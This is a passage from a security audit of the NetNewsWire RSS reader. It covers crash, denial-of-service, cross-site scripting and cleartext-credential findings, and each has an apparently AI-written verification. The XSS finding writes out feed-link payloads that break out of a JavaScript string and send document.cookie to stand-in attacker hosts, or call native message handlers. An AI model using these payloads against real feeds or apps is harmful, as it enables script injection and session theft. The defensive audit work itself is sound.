The code is exactly as described. `handleCharacters` appends every incoming byte slice into `charactersBuffer` without any bound check when `storingCharacters == true`.

**B. Tracing the call chain outward**

1. **`RSSDelegate.xmlSAXParser(_:didStartElement:…)`** (RSSParser.swift line 136): calls `parser.beginStoringCharacters()` for virtually every element that's not inside a channel image — no exception, no size guard.
2. **`RSSParser.parse(parserData)`** → `XMLSAXParser.parse(parserData.data)` → `Array(data)` (heap copy #1).
3. **`XMLScanner.scanCDATA()`** (line 317): `Array(input[start..<end])` — second full heap copy of the CDATA section.
4. **`handleCharacters`** appends that slice into `charactersBuffer` — accumulation without cap (finding's claim confirmed).
5. **`currentStringWithTrimmedWhitespace`**: `String(decoding: charactersBuffer, as: UTF8.self)` — a third copy.
6. **`FeedParser.parse(_:)`** calls `RSSParser.parse()` with no size check.
7. **`LocalAccountRefresher.downloadSession(_:downloadDidComplete:…)`** passes the full `Data` object from the download to `FeedParser.parse()` with no size check.

**C. Looking for defences**

**`shouldContinueAfterReceivingData`** (LocalAccountRefresher.swift line 375–381):
```swift
guard !data.isDefinitelyNotFeed(), !isSuspended else { return false }
return true
```
`isDefinitelyNotFeed()` only returns `true` when the magic bytes match PNG, JPEG, or GIF. Any XML payload — regardless of size — passes through.

**URLSession configuration** (DownloadSession.swift line 73): `timeoutIntervalForRequest = 15.0` — this is the *connection establishment* timeout, not a data-transfer timeout. `timeoutIntervalForResource` is not set (defaults to 7 days). A server can stream 50 MB legitimately within the 15-second window on any broadband link.

**`DownloadInfo.addData`** (line 537): `data.append(d)` — unbounded accumulation at the HTTP layer.

**No content-length pre-check** anywhere between the HTTP response and the parser.

**D. Edge-case probing**

No encoding trick is needed. A plain text XML feed with a large `<![CDATA[…]]>` block (or even just a large `<description>` text node) is sufficient. The CDATA path creates an *additional* full copy beyond what's already buffered, amplifying peak usage to roughly 4× the feed size. The crash persists on automatic background refresh until the user manually removes the subscription.

---

**Verdict**

The finding is confirmed. There is an external network entry point (`LocalAccountRefresher`), no upstream size gate, and no parser-level cap. A single large feed response causes ~4× its size in peak memory on iOS, where the OS will terminate the process; on the next scheduled refresh the cycle repeats, creating a persistent crash loop for that account.

### 20. [MEDIUM] Unconditional force-cast trap kills app on theme decoding error
**Class:** CWE-704
**CWE:** CWE-704 - https://cwe.mitre.org/data/definitions/704.html
**File:** `iOS/UIKit Extensions/UIViewController+Extras.swift:22-29`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
In the `.typeMismatch` branch (line 22–25) and `.valueNotFound` branch (line 26–29) of the `DecodingError` switch, the associated values `type: Any.Type` and `value: Any.Type` are force-cast with `as! CVarArg` before being passed to `NSString.localizedStringWithFormat`. Swift metatypes (e.g. `String.Type`, `Int.Type`, `Bool.Type`) do not conform to the `CVarArg` protocol; no conformance is declared in the standard library or Foundation overlays. A force-cast to an unconformed protocol type is a Swift fatal error (`EXC_BAD_INSTRUCTION`) that terminates the process immediately. Because the error handler is reached whenever the theme's Info.plist decoder produces a `.typeMismatch` or `.valueNotFound` error — both routine outcomes of an intentionally malformed plist — the crash fires before the guard `return` or any fallback path can execute. The data flow is: external theme file → `PropertyListDecoder` → `DecodingError.typeMismatch(type, context)` → `presentError(_:)` → `type as! CVarArg` → fatal trap.

#### Impact
Any user who opens a crafted .nnwtheme file whose Info.plist contains a type-mismatched or value-missing field will experience a guaranteed app crash during error reporting. The crash happens deterministically and reproducibly from a single externally-supplied file, constituting an attacker-controlled denial-of-service.

#### Exploit scenario
An attacker publishes a `.nnwtheme` file whose `Info.plist` contains a key with a deliberate type mismatch (e.g., the `name` field declared as `String` in the theme model is supplied as an integer `42` in the plist). A victim user receives the file via AirDrop, email, or a share link and opens it in NetNewsWire via the iOS URL/file-open handler. `PropertyListDecoder` raises `DecodingError.typeMismatch(String.Type, ...)`. `presentError` is called, reaches the `.typeMismatch` branch, and executes `String.Type as! CVarArg`, which traps instantly. The app crashes with `EXC_BAD_INSTRUCTION` before the alert is shown. The user can restart the app because the bad theme is (presumably) not persisted, but any script that re-delivers the file will crash the app on every open attempt.

#### Preconditions
- Attacker can deliver a .nnwtheme file to the victim (AirDrop, iMessage, web link, etc.)
- Victim opens the file in NetNewsWire (via scene(_:openURLContexts:) or Files share sheet)
- The theme's Info.plist contains a field whose declared Swift type does not match the plist value, triggering DecodingError.typeMismatch or .valueNotFound

```
case .typeMismatch(let type, _):
    let localizedError = NSLocalizedString("This theme cannot be used because the the type—"%@"—is mismatched in the Info.plist", comment: "Type mismatch")
    informativeText = NSString.localizedStringWithFormat(localizedError as NSString, type as! CVarArg) as String
    presentError(title: errorTitle, message: informativeText, dismiss: dismiss)
case .valueNotFound(let value, _):
    let localizedError = NSLocalizedString("This theme cannot be used because the the value—"%@"—is not found in the Info.plist.", comment: "Decoding value missing")
    informativeText = NSString.localizedStringWithFormat(localizedError as NSString, value as! CVarArg) as String
    presentError(title: errorTitle, message: informativeText, dismiss: dismiss)
```

#### How to fix
Replace the force-cast with a safe conditional or a type-description helper. For the `%@`-formatted message, use the type's textual description directly without going through CVarArg: `informativeText = String(format: localizedError, String(describing: type))` (Swift's `String(format:)` accepts `CVarArg` arguments, but `String(describing:)` on a metatype returns a safe `String` which does conform). Alternatively call `presentError(title: errorTitle, message: "\(type)", dismiss: dismiss)` without any variadic formatting. The same fix applies to both lines 24 and 28.

**Exploitability:** DecodingError.typeMismatch or .valueNotFound during theme plist decoding triggers an unconditional force-cast of a Swift metatype to CVarArg — a protocol the type does not conform to — causing EXC_BAD_INSTRUCTION and process death. CVSS 6.5 (AV:N/AC:L/PR:N/UI:R/A:H). Triggered by feeding a malformed .nnwtheme through the deep-link download chain (finding 0).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Fully confirmed call chain from unauthenticated file-open URL handler; metatypes provably do not conform to CVarArg; force-cast at lines 24/28 is an unconditional fatal trap on any type-mismatched or value-absent theme Info.plist

I now have a complete picture. Let me summarize the verified findings:

**Analysis**

**Step A — Actual code at cited lines:**
Lines 22–29 of `iOS/UIKit Extensions/UIViewController+Extras.swift` exactly match the scanner's report. The force-casts `type as! CVarArg` (line 24) and `value as! CVarArg` (line 28) are real. In Swift, `DecodingError.typeMismatch` and `.valueNotFound` carry `Any.Type` metatype values (e.g., `String.Type`). Metatypes do **not** conform to `CVarArg` — no standard-library or Foundation conformance exists for them. A force-cast to an unconformed protocol is a Swift fatal trap (`EXC_BAD_INSTRUCTION`), not a thrown error that can be caught.

**Step B — Call chain to external entry point (iOS):**
1. `scene(_:openURLContexts:)` — `SceneDelegate.swift` line 183: opens any URL whose path ends in `.nnwtheme` → no authentication required, reachable via AirDrop, email, web `netnewswire://` link, or Files share sheet.
2. → `SceneCoordinator.importTheme(filename:)` line 1501: calls `ArticleThemeImporter.importTheme(controller:url:)`.
3. → `ArticleThemeImporter.importTheme` line 14: `let theme = try ArticleTheme(url: url, isAppTheme: false)` — decodes Info.plist via `PropertyListDecoder`.
4. → A type-mismatched plist value throws `DecodingError.typeMismatch(String.Type, context)`.
5. → Error propagates out; caught in `SceneCoordinator` line 1502–1503 and posted as `didFailToImportThemeWithError` notification.
6. → `SceneCoordinator.themeDownloadDidFail` line 626: `self.rootSplitViewController.presentError(error, dismiss: nil)`.
7. → `UIViewController.presentError(_:dismiss:)` — `UIViewController+Extras.swift` line 22 branch → `type as! CVarArg` → **fatal trap, app terminates**.

No try/catch exists around the force-cast. The victim can restart the app (the bad theme was not persisted, because `ArticleThemesManager.importTheme` — which only does a file copy — is only called *after* user confirmation, and the crash happens during the initial parse before any confirmation dialog appears).

**Step C/D — Defences:**
None. No validation of the decoded type value before casting. No recovery path. Identical flawed pattern also exists in `Mac/AppDelegate.swift` lines 997–1002 (same force-casts in `themeImportError`).

---

### 21. [MEDIUM] Unchecked array subscript on Link header crashes app
**Class:** CWE-129
**CWE:** CWE-129 - https://cwe.mitre.org/data/definitions/129.html
**File:** `Modules/RSWeb/Sources/RSWeb/HTTPLinkPagingInfo.swift:28-33`
**CVSS 3.1:** **5.9** (Medium) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
In `HTTPLinkPagingInfo.init(urlResponse:)`, the value of the server-supplied `Links:` HTTP header is split by `","` to produce `links`, then each element is split by `"; "` to produce `components`. The code then unconditionally accesses `components[0]` and `components[1]` (line 31-32). Swift's `String.components(separatedBy:)` always returns at least one element; it returns exactly one element when the separator is absent. If a link entry such as `<https://example.com/page/2>` arrives without the `; rel="next"` token, `components` contains one element and `components[1]` is a fatal out-of-bounds access that aborts the process. Trust boundary: the `Links:` header value arrives from an untrusted remote HTTP server and is parsed without any guard on the resulting array length before the subscript.

#### Impact
Any remote server that returns an HTTP response with a 'Links:' header lacking the expected '; ' separator can cause an immediate fatal crash (index out-of-bounds) that terminates the NetNewsWire process on both macOS and iOS. Every subscriber to a feed hosted on a malicious or misconfigured server is affected.

#### Exploit scenario
An attacker operates a feed server at any URL to which a victim has subscribed. During pagination, the server returns any HTTP response that carries the header `Links: <https://attacker.example/page/2>` (no semicolon or `rel` attribute). NetNewsWire calls `HTTPLinkPagingInfo(urlResponse:)`, splits the value on `"; "`, gets a one-element array, and fatally crashes on `components[1]`. The app terminates immediately and the crash recurs on every refresh until the user removes the subscription.

#### Preconditions
- User has subscribed to a feed hosted by a server under attacker control (the core use-case of an RSS reader).
- The server sends a non-standard 'Links:' HTTP header (note: the header name constant in HTTPResponseHeader.swift is 'Links', not the standard 'Link', so the server must use this exact capitalisation).
- The header value for at least one link component must omit the '; ' separator.

```
for link in links {
    let components = link.components(separatedBy: "; ")
    let page = components[0].trimmingCharacters(in: CharacterSet(charactersIn: " <>"))
    dict[components[1]] = page  // fatal crash when components has only 1 element
}
```

#### How to fix
Add a bounds check before accessing `components[1]`. Replace the unchecked loop body with: `guard components.count >= 2 else { continue }`. Additionally, fix the header name constant in HTTPResponseHeader.swift from `"Links"` to the standard `"Link"`.

**Exploitability:** HTTPLinkPagingInfo unconditionally accesses components[1] after splitting the server-supplied Link header on '; '. A Link entry without the rel token yields a one-element array and crashes the process on out-of-bounds access. CVSS 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/A:H). AC:H because the header must be malformed in a specific way; any paginatable feed server could trigger this.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — `components[1]` is accessed with no bounds check; crash is certain if any element of the `Links:` header is missing its `"; "` separator; reachable via the hardcoded Feedbin HTTPS API but not via arbitrary feed servers as the scanner claims

Now I have everything needed to render a verdict. Here is my analysis:

---

**A. What the code actually does (lines 28–32)**

```swift
for link in links {
    let components = link.components(separatedBy: "; ")
    let page = components[0].trimmingCharacters(in: CharacterSet(charactersIn: " <>"))
    dict[components[1]] = page          // ← fatal if components.count == 1
}
```

`String.components(separatedBy:)` always returns ≥ 1 element. If a link entry lacks `"; "`, `components` has exactly one element and `components[1]` is an unconditional fatal out-of-bounds crash. The code is exactly as the scanner describes.

**B. Call-chain and trust boundary**

`HTTPLinkPagingInfo(urlResponse:)` is called from exactly three places, all in `FeedbinAPICaller.swift` (lines 306, 351, 367). Every call site uses `feedbinBaseURL`, which is **hardcoded** to `"https://api.feedbin.com/v2/"`. This is not an arbitrary feed server — it is the Feedbin sync API, contacted over HTTPS.

The response body is JSON; the `Links:` header (`HTTPResponseHeader.link == "Links"`) is parsed from whatever Feedbin's server sends back. There is **no other caller** of `HTTPLinkPagingInfo` in the codebase.

**C. Defences and their completeness**

- **No bounds guard at all**: `components.count >= 2` is never checked.  
- **HTTPS only**: `feedbinBaseURL` is hardcoded HTTPS, so a passive network observer cannot inject this header. An active MITM would need to forge a certificate (AC:H).  
- **No certificate pinning** in the codebase — so a CA-level or network-level MITM (or a compromise of `api.feedbin.com` itself) would suffice.  
- **`NSAllowsArbitraryLoads: true`** does not help here because the hardcoded URL already specifies `https://`.

**D. Scanner's exploit scenario — partly wrong**

The scanner says "attacker operates a feed server at any URL to which a victim has subscribed." That is **incorrect**: the vulnerable code is never called when fetching arbitrary RSS feeds. It is exclusively called with responses from `api.feedbin.com`. The scanner mis-stated the data source, but the underlying code defect and crash path are real.

**True attack surface:**  
- Feedbin account holders only  
- Attacker must control the Feedbin API server **or** perform a certificate-forging MITM on `api.feedbin.com`  
- Any response that omits the `; rel="…"` portion of a `Links:` header triggers an immediate fatal process termination (app crash), recurring on every background sync

The code defect is genuine and unambiguously confirmed; only the exploitability is more constrained than the scanner claimed.

---

### 22. [MEDIUM] Feed-controlled data injected into JavaScript string literals
**Class:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
**CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) - https://cwe.mitre.org/data/definitions/79.html
**File:** `Resources/Themes/Appanoose.nnwtheme/template.html:1-22`
**CVSS 3.1:** **5.4** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *internal-network position required*
**Confidence:** 0.92 (1 run agreed)
**Also at:** `Themes/Appanoose.nnwtheme/template.html:1-21`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
Lines 3 and 8 place `[[external_link_stripped]]` and `[[feed_link]]` directly inside double-quoted JavaScript string literals, with no escaping for the JS string context:

```
const externalLink = "[[external_link_stripped]]";
...
const feedLink = "[[feed_link]]";
```

Data flow:
1. A remote RSS feed supplies an `<link>` element value, e.g. `https://attacker.com/?x=";fetch('https://c2.attacker.com/?d='+btoa(document.cookie));//`
2. The RSParser module extracts this URL and stores it as the article's `external_link`.
3. The app computes `external_link_stripped` by stripping the scheme prefix, yielding `attacker.com/?x=";fetch(...);//`.
4. The Swift template engine substitutes `[[external_link_stripped]]` verbatim (no HTML- or JS-escaping) into the template before handing the HTML string to WKWebView.
5. The WKWebView parses and executes the resulting script block:
   ```js
   const externalLink = "attacker.com/?x=";fetch('https://c2.attacker.com/?d='+btoa(document.cookie));//";
   ```
   The `"` in the URL terminates the string; the injected call executes on `DOMContentLoaded` with no user interaction required.

The same applies to `[[feed_link]]` on line 8, controllable by whoever operates the feed server (including a MITM on the unencrypted `http://` feed URLs the app supports).

#### Impact
A malicious or compromised RSS feed can break out of the JavaScript string context and execute arbitrary JavaScript in the NetNewsWire WKWebView when an article is rendered. Because the WKWebView has registered WKScriptMessageHandlers (listed as `userContentController(_:didReceive:)` entry points), injected code can invoke native-app handlers without any user gesture, potentially escalating to native API access. Every subscriber to the malicious feed is affected.

#### Exploit scenario
Attacker publishes an RSS feed containing an item whose `<link>` is `https://evil.com/?p=";window.webkit.messageHandlers.netnewswire.postMessage({action:'openURL',url:'file:///etc/passwd'});//`. The user subscribes. When NetNewsWire renders the article using the Appanoose theme, the injected JS fires on page load, posts a crafted message to the native WKScriptMessageHandler, and (depending on handler logic) triggers a native action without any click required.

#### Preconditions
- Victim uses the Appanoose theme (the default/starter theme)
- Victim subscribes to an attacker-controlled or compromised RSS feed

```
const externalLink = "[[external_link_stripped]]";
...
const feedLink = "[[feed_link]]";
```

#### How to fix
The template substitution engine must apply JavaScript string escaping (backslash-escape `\`, `"`, `\n`, `\r`, U+2028, U+2029) for any `[[variable]]` placed inside a JS string literal, separate from HTML escaping. Better: move the external-link and feed-link values to the HTML as `data-` attributes on a DOM element and read them with `dataset` in JS, so they are always in the safe HTML-attribute context where HTML-encoding is the single required defense. Specifically, replace lines 3 and 8 of `Appanoose.nnwtheme/template.html` with a data-attribute approach and update the Swift substitution engine to HTML-encode these values.

**Exploitability:** Appanoose theme places [[external_link_stripped]] and [[feed_link]] verbatim inside double-quoted JavaScript string literals. A feed link containing a quote terminates the string and injects arbitrary JS executed on DOMContentLoaded with no further user interaction. CVSS ~4.9 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L). Broader template XSS but confined to JS context rather than full HTML.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — verbatim substitution of attacker-controlled RSS link values into JS string literals with no JS escaping; JS enabled by default; confirmed data-flow from remote feed to WKWebView execution

I now have all the evidence needed for a thorough verdict. Here is my analysis:

---

**Evidence gathered**

**A. The template (confirmed)**
`template.html` lines 3 and 8 place the substitution tokens *inside* double-quoted JS string literals:
```js
const externalLink = "[[external_link_stripped]]";
const feedLink = "[[feed_link]]";
```

**B. The substitution engine (confirmed, no escaping)**
`MacroProcessor.processMacros()` does a pure `String.append(contentsOf: replacement)` — no HTML encoding, no JS string escaping at any point. The `renderedText(withTemplate:substitutions:)` call in `ArticleRenderer.articleHTML` never adds any escaping layer.

**C. The source values (confirmed, attacker-controlled)**

- **`external_link_stripped`** = `externalLink.strippingHTTPOrHTTPSScheme` — this only removes the `http://`/`https://` prefix via two `stripping(prefix:)` calls. A URL like `https://evil.com/?x=";injected_js;//` becomes `evil.com/?x=";injected_js;//` — the `"` survives.
- **`feed_link`** = `article.feed?.homePageURL ?? ""` — the feed's `<link>` element extracted by `RSSParser.swift` as `parser.currentStringWithTrimmedWhitespace` with no URL validation or character filtering.

**D. JavaScript is enabled by default**
Both iOS (`iOS/AppDefaults.swift:401`) and macOS (`Mac/AppDefaults.swift:347`) register `articleContentJavascriptEnabled: true` as the default. `WKWebpagePreferences.allowsContentJavaScript` is set from this value, so the `<script>` block in the template runs by default.

**E. WKScriptMessageHandler capabilities (confirmed)**
iOS registers three handlers: `imageWasClicked`, `imageWasShown`, `showFeedInspector`. The `imageWasClicked` handler calls `Downloader.shared.download(imageURL:)` with a completely attacker-supplied URL, effectively turning JS injection into an arbitrary outbound HTTP request triggered from the native layer. macOS registers `windowDidScroll`, `mouseDidEnter`, `mouseDidExit` — lower-impact but still confirms the JS→native bridge is callable.

**F. No upstream defence found**
No sanitisation of URL characters in `RSParser`, no allow-list on link values, no escaping wrapper around the substitution dictionary, no CSP header (content is `loadHTMLString`). ATS is globally disabled so the webview can fetch arbitrary HTTP endpoints.

---

**Exploitation path:** Attacker publishes a feed with `<link>https://evil.com/?q=";fetch('https://c2/x?d='+btoa(document.cookie));//</link>`. User subscribes and views any article. On `DOMContentLoaded`, `const externalLink = "evil.com/?q=";` closes the string, the `fetch()` call executes, and `imageWasClicked` is also callable to force an arbitrary native download. No click required after the initial subscription.

### 23. [MEDIUM] FreshRSS API URL accepts HTTP, transmitting credentials in cleartext
**Class:** CWE-319: Cleartext Transmission of Sensitive Information
**CWE:** CWE-319: Cleartext Transmission of Sensitive Information - https://cwe.mitre.org/data/definitions/319.html
**File:** `Mac/Preferences/Accounts/AccountsReaderAPIWindowController.swift:117-148`
**CVSS 3.1:** **5.3** (Medium) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.72 (1 run agreed)

#### Description
The FreshRSS branch of `AccountsReaderAPIWindowController.action(_:)` (Mac) and `ReaderAPIAccountViewController.apiURL()` (iOS) accepts the raw user-supplied string and converts it to a URL without checking the scheme. Both code paths use `URL(string:)` with only a nil-guard (Mac line 119) or a force-unwrap after a presence-only check (iOS line 266). The resulting URL—potentially `http://`—is assigned to `apiURL` and then passed verbatim as the `endpoint` parameter to `Account.validateCredentials(type: .freshRSS, credentials: credentials, endpoint: apiURL)` at line 148 (Mac) / line 161 (iOS). `ReaderAPIAccountDelegate.validateCredentials` forwards this URL to `ReaderAPICaller.validateCredentials(endpoint:)`, which posts the `readerBasic` credential pair (username + password) as form data or Authorization headers to whatever URL was supplied. After the account is created, `account.endpointURL` is permanently set to that HTTP URL (Mac line 161 / iOS line 170), so every background sync for the lifetime of the account transmits session tokens over cleartext HTTP. The hardcoded services (Inoreader, BazQux, TheOldReader) use fixed HTTPS hosts and are unaffected; only FreshRSS, whose URL is user-supplied, is vulnerable.

#### Impact
A user who configures a FreshRSS account with an http:// endpoint URL will have their username and password (sent as readerBasic credentials during authentication and every subsequent sync) exposed to any passive observer on the same network path. Because the app provides no warning and accepts any parseable URL, a socially-engineered or uninformed user can unknowingly commit to permanent cleartext credential exchange. All downstream ReaderAPI sync calls (article status, feed list) to that endpoint inherit the same cleartext channel.

#### Exploit scenario
A less-technical user adds a FreshRSS account and types `http://rss.home.example.com/api/greader.php` (the URL shown in their sysadmin's setup guide, which omitted HTTPS). NetNewsWire accepts this URL, issues an HTTP POST to authenticate, and sends the readerBasic Credentials struct containing their plaintext password. On the same Wi-Fi network, a passive observer running Wireshark captures the full HTTP request body, recovering both the username and password. These credentials also authenticate the user's FreshRSS web interface. The same observer continues to capture every subsequent background sync (article IDs, read/starred states) because `account.endpointURL` retains the HTTP URL permanently.

#### Preconditions
- User selects FreshRSS as the account type (the only ReaderAPI variant that accepts a custom URL)
- User enters or is socially engineered into entering an http:// URL — no HTTPS warning is displayed
- App Transport Security (ATS) must not globally block the specific host; a self-hosted HTTP endpoint on a non-standard domain may fall outside ATS default exceptions

```
// Mac — AccountsReaderAPIWindowController.swift:119-123
case .freshRSS:
    guard let inputURL = URL(string: apiURLTextField.stringValue.trimmingWhitespace) else {
        self.errorMessageLabel.stringValue = NSLocalizedString("Invalid API URL.", comment: "Invalid API URL")
        return
    }
    apiURL = inputURL   // ← no scheme check; http:// accepted

// iOS — ReaderAPIAccountViewController.swift:266
case .freshRSS:
    return URL(string: apiURLTextField.text!.trimmingWhitespace)!  // ← same, no scheme check
```

#### How to fix
Before constructing `apiURL`, validate that the parsed URL's scheme is `https`. Reject or warn the user if an `http://` scheme is detected. In `AccountsReaderAPIWindowController.action(_:)` (Mac), after line 119, add: `guard inputURL.scheme?.lowercased() == "https" else { self.errorMessageLabel.stringValue = NSLocalizedString("API URL must use HTTPS.", comment: ""); return }`. Apply the equivalent guard in `ReaderAPIAccountViewController.validateDataEntry()` (iOS) before returning `true` for the freshRSS case. The same check should be applied in `ReaderAPIAccountViewController.apiURL()` before force-returning the URL.

**Exploitability:** FreshRSS account setup accepts a user-supplied http:// endpoint. With ATS globally disabled (finding 2), every sync request — including initial credentials and all subsequent session tokens — travels in cleartext for the account's lifetime. Adjacent-network attacker can passively capture. CVSS ~5.3 (AV:N/AC:H). AC:H because the user must configure an http:// endpoint; once configured the exposure is ongoing.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — No scheme validation on the user-supplied FreshRSS URL, ATS globally disabled in both Info.plist files, and credentials are transmitted as HTTP POST form body to that URL, with the endpoint permanently stored for all future syncs.

I now have a complete picture of the entire call chain. Here is my analysis:

**A. What the code actually does**

- **Mac** (`AccountsReaderAPIWindowController.swift`, lines 118-123): `URL(string: apiURLTextField.stringValue.trimmingWhitespace)` is constructed from raw user input with only a nil-guard — no scheme check. The URL is passed verbatim to `Account.validateCredentials(…endpoint: apiURL)` at line 148 and permanently stored at `account?.endpointURL = apiURL` (line 161).
- **iOS** (`ReaderAPIAccountViewController.swift`, lines 263-266): `apiURL()` returns `URL(string: apiURLTextField.text!.trimmingWhitespace)!` with no scheme check — identical problem, force-unwrapped after only a nil check in `validateDataEntry()`.

**B. Call chain to network**

`validateCredentials` → `ReaderAPIAccountDelegate.validateCredentials` → `ReaderAPICaller.validateCredentials(endpoint:)` → `URLRequest(url: endpoint.appendingPathComponent(ReaderAPIEndpoints.login.rawValue), readerAPICredentials: credentials)`.

`URLRequest+ReaderAPI.swift` (lines 25-34) confirms: when credential type is `.readerBasic`, the request is a **HTTP POST** with `Content-Type: application/x-www-form-urlencoded` and body `Email=<username>&Passwd=<password>`. Username and password go into the request body sent to exactly the URL the user typed.

**C. Defences — none found**
- No scheme check anywhere between user input and the network call.
- No HTTPS warning or enforcement in the UI.
- Both `iOS/Resources/Info.plist` and `Mac/Resources/Info.plist` have `NSAllowsArbitraryLoads: true` — App Transport Security is globally disabled, so the OS provides no safety net against `http://` connections.

**D. Permanent damage**
After successful validation, `account?.endpointURL = apiURL` permanently stores the HTTP URL. Every subsequent background sync (`refreshAll`, article fetching, read-state sync) uses `ReaderAPICaller` with `readerAPICredentials: self.credentials` against the same base URL, transmitting session tokens over cleartext HTTP for the entire lifetime of the account.

**Summary:** No scheme validation, ATS globally disabled, credentials (username + password) POSTed as form data to a user-controlled URL, and the URL permanently retained — all confirmed in source. The only precondition is a user who enters `http://` (mistake or social engineering, on a self-hosted instance where setup guides may use plain HTTP).

### 24. [MEDIUM] NSAllowsArbitraryLoads Globally Disables ATS on iOS and macOS
**Class:** CWE-319: Cleartext Transmission of Sensitive Information
**CWE:** CWE-319: Cleartext Transmission of Sensitive Information - https://cwe.mitre.org/data/definitions/319.html
**File:** `iOS/Resources/Info.plist:64-68`
**CVSS 3.1:** **4.7** (Medium) — `CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *AV:A (non-network)*
**Confidence:** 0.95 (1 run agreed)
**Also at:** `Mac/Resources/Info.plist:55-59`

*1 additional call site(s) collapsed during dedup — same root cause; each location needs the same fix applied.*

#### Description
Both Info.plist files (iOS line 66, macOS line 58) set `NSAllowsArbitraryLoads` to `true` at the top level of `NSAppTransportSecurity`, with no `NSExceptionDomains` or `NSAllowsArbitraryLoadsInWebContent` sub-keys. This single flag globally opts every URLSession in the process out of ATS, which otherwise enforces TLS 1.2+, forward-secrecy ciphers, and rejection of plaintext HTTP. The macOS Info.plist is identical (Mac/Resources/Info.plist:55-59). Consequences in this specific codebase: (1) `URLSession.webservice` used throughout `NewsBlurAPICaller` will follow HTTP redirects and honour server-negotiated downgrades. The `Cookie: newsblur_sessionid=…` header set at URLRequest+NewsBlur.swift:38 travels with every request; if any leg uses HTTP the session token is cleartext. (2) All RSS/Atom/JSON Feed URLs that start with `http://` are fetched without encryption — content can be replaced by an on-path attacker and the injected HTML is subsequently rendered in WKWebView. (3) `addBasicAuthorization` in URLRequest+RSWeb.swift carries only a comment warning against HTTP use; ATS removal means the warning is never mechanically enforced.

#### Impact
Every URLSession request the app makes — RSS feed fetches, sync-service API calls, image downloads — is permitted to use plaintext HTTP with no minimum-TLS enforcement. An on-path attacker on a shared or rogue network can read and rewrite arbitrary feed content before it reaches the WKWebView renderer. The same transport bypass applies to NewsBlur session-cookie headers (URLRequest+NewsBlur.swift:38) and any Basic-Auth headers sent to other sync services if an HTTP redirect is followed.

#### Exploit scenario
A user on a coffee-shop Wi-Fi whose RSS reader is subscribed to any `http://` feed (extremely common for self-hosted or legacy feeds) connects. The attacker ARP-spoofs the gateway and intercepts the plaintext HTTP feed response. The attacker replaces the `<content>` element with HTML containing a `<script>` tag or a `<meta http-equiv=refresh>` that navigates the WKWebView to a phishing URL. Because the NewsBlur base URL is HTTPS the attacker cannot steal credentials on the initial login, but if the attacker causes a 301 redirect from any subsequent API endpoint to HTTP, the `Cookie: newsblur_sessionid=…` header (URLRequest+NewsBlur.swift:38) is transmitted in plaintext, yielding a valid session token.

#### Preconditions
- Attacker must hold an on-path position between the device and the network (e.g., rogue AP, ARP poisoning on the same LAN segment).
- At least one subscribed RSS feed must use an http:// URL OR the attacker must be able to force an HTTP redirect from a sync-service endpoint.

```
<key>NSAppTransportSecurity</key>
<dict>
	<key>NSAllowsArbitraryLoads</key>
	<true/>
</dict>
```

#### How to fix
Remove the global `NSAllowsArbitraryLoads` key. Replace it with targeted per-domain exceptions only where HTTP is genuinely required (e.g., `NSExceptionAllowsInsecureHTTPLoads` scoped to specific legacy feed hosts, with `NSExceptionMinimumTLSVersion` set). For WKWebView content specifically, use `NSAllowsArbitraryLoadsInWebContent` if HTTP article bodies must be displayed, while keeping URLSession calls protected. Apply the same fix to Mac/Resources/Info.plist:55-59.

**Exploitability:** NSAllowsArbitraryLoads:true globally removes ATS across all URLSession instances in both iOS and macOS targets, eliminating TLS 1.2+ enforcement and forward-secrecy requirements. On its own this is a configuration weakness; its primary role is as a force-multiplier enabling findings 43 and T1 (NewsBlur cleartext POST), and removing the last client-side safeguard for any http:// feed URL. CVSS 5.4 (AV:A/AC:H/S:C).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — NSAllowsArbitraryLoads:true enables an on-path attacker to inject arbitrary HTML/script into any HTTP feed response; injected content executes in WKWebView (script-initiated navigation bypasses the linkActivated guard), enabling phishing redirects and WKWebView-scope data theft; the NewsBlur session-cookie sub-claim is overstated as the API base URL is hardcoded HTTPS.

I now have sufficient evidence. Let me summarize what I found:

---

**Analysis**

**A. Confirmed code at cited lines**
Both `iOS/Resources/Info.plist` (lines 64–68) and `Mac/Resources/Info.plist` (lines 55–59) contain `NSAllowsArbitraryLoads = true` with **no** sub-keys (`NSExceptionDomains`, `NSAllowsArbitraryLoadsInWebContent`, etc.). This is exactly as described — ATS is globally disabled.

**B. Attack paths verified**

**Feed content injection path (valid):**
- `LocalAccountRefresher` / account delegates fetch arbitrary URLs including `http://` feeds
- Article body is set as `body = article?.body ?? ""` in `ArticleRenderer.swift:117` — raw, unsanitized feed HTML
- `webView.loadHTMLString(html, baseURL: ArticleRenderer.page.baseURL)` at `WebViewController.swift:648` renders this into the WKWebView
